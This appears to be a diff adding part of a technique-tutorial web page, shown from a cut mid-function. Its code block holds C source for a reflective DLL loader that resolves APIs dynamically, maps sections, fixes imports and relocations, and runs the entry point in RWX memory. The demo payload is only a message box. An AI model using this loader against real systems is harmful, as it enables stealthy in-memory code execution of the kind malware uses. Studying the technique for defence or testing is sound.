+    DWORD_PTR base_address = (DWORD_PTR)new_image_base;
+
+
+    READPROCMEMORY p_ReadProcessMemory = (READPROCMEMORY)p_GetProcAddress((HMODULE)kernel32_base, read_proc_memory_string);
+    GETCURRENTPROCESS p_GetCurrentProcess = (GETCURRENTPROCESS)p_GetProcAddress((HMODULE)kernel32_base, get_cur_proc_string);
+    
+
+    DWORD size_of_header = nt_header_raw->OptionalHeader.SizeOfHeaders;
+    //// copy headers from raw byte to new memory 
+    memory_copy(base_address, dll_base, size_of_header);
+    // define header in new memory  
+    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_address;
+    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base_address + dos_header->e_lfanew);
+
+    //// copy all sections from raw byte to new memory 
+    DWORD number_of_section = nt_header_raw->FileHeader.NumberOfSections;
+    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_header_raw);
+
+    for (DWORD i = 0; i &lt; number_of_section; i++) {
+        DWORD_PTR section_on_raw_bytes = dll_base + section_header[i].PointerToRawData;
+        DWORD_PTR section_on_memory = base_address + section_header[i].VirtualAddress;
+        if (section_header[i].SizeOfRawData > 0) {
+            memory_copy(section_on_memory, section_on_raw_bytes, section_header[i].SizeOfRawData);
+        }
+    } 
+  
+
+    // fix value of function in import table (in new memory)  
+    PIMAGE_DATA_DIRECTORY import_data_directory = &nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(base_address + import_data_directory->VirtualAddress);
+
+    LOADLIBRARYA p_LoadLibraryA = (LOADLIBRARYA)p_GetProcAddress((HMODULE)kernel32_base, load_library_string);
+   
+    while (import_descriptor->Name != NULL) {
+        HMODULE module_address = p_LoadLibraryA((LPCSTR)(base_address + import_descriptor->Name));
+        if (module_address) {
+            PIMAGE_THUNK_DATA function_array = (PIMAGE_THUNK_DATA)(base_address + import_descriptor->FirstThunk);
+            while (function_array->u1.AddressOfData != NULL) {
+                if (IMAGE_SNAP_BY_ORDINAL(function_array->u1.Ordinal)) {
+                    LPCSTR function_ord = (LPCSTR)IMAGE_ORDINAL(function_array->u1.Ordinal);
+                    function_array->u1.Function = (DWORD_PTR)p_GetProcAddress(module_address, function_ord);
+                }
+                else {
+                    PIMAGE_IMPORT_BY_NAME function_raw = (PIMAGE_IMPORT_BY_NAME)(base_address + function_array->u1.AddressOfData);
+                    function_array->u1.Function = (DWORD_PTR)p_GetProcAddress(module_address, (LPCSTR)function_raw->Name);
+                }
+                function_array++; // next thunk (import by name)
+            }
+        }
+        import_descriptor++; // move to next import descriptor 
+    }
+
+
+    // perform image base relocations
+    IMAGE_DATA_DIRECTORY relocations = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)base_address;
+    DWORD relocationsProcessed = 0;
+    DWORD_PTR deltaImageBase = (DWORD_PTR)base_address - (DWORD_PTR)nt_header->OptionalHeader.ImageBase;
+    while (relocationsProcessed &lt; relocations.Size)
+    {
+        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
+        relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
+        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
+
+        for (DWORD i = 0; i &lt; relocationsCount; i++)
+        {
+            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
+
+            if (relocationEntries[i].Type == 0)
+            {
+                continue;
+            }
+
+            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
+            DWORD_PTR addressToPatch = 0;
+            p_ReadProcessMemory(p_GetCurrentProcess(), (LPCVOID)((DWORD_PTR)base_address + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
+            addressToPatch += deltaImageBase;
+            memory_copy((DWORD_PTR)base_address + relocationRVA, addressToPatch, sizeof(DWORD_PTR));
+        }
+    }
+    
+    VIRTUALPROTECT p_VirtualProtect = (VIRTUALPROTECT)p_GetProcAddress((HMODULE)kernel32_base, virtual_protect_string);
+    DWORD old_protect;
+    p_VirtualProtect(new_image_base, dll_size, PAGE_EXECUTE_READWRITE, &old_protect);
+
+    DLLENTRY DllEntry = (DLLENTRY)((DWORD_PTR)base_address + nt_header->OptionalHeader.AddressOfEntryPoint);
+    (*DllEntry)((HINSTANCE)base_address, DLL_PROCESS_ATTACH, 0);
+
+    p_VirtualProtect(new_image_base, dll_size, PAGE_NOACCESS, &old_protect);
+    return (DWORD_PTR)base_address; // Im trying to delete the execute memory but just can not find the way 
+}
+#pragma optimize("", on)
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, "Reflective DLL Injected Successfully!", "Alert", MB_OK);
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}</code></pre>
+        </section>
+      </article>
+      <div id="modal" class="modal">
+        <span id="closeModal" class="close-btn">&times;</span>
+      </div>
+    </main>
+    <script src="../../../assets/app.obf.js" defer></script>
+  </body>
+</html>
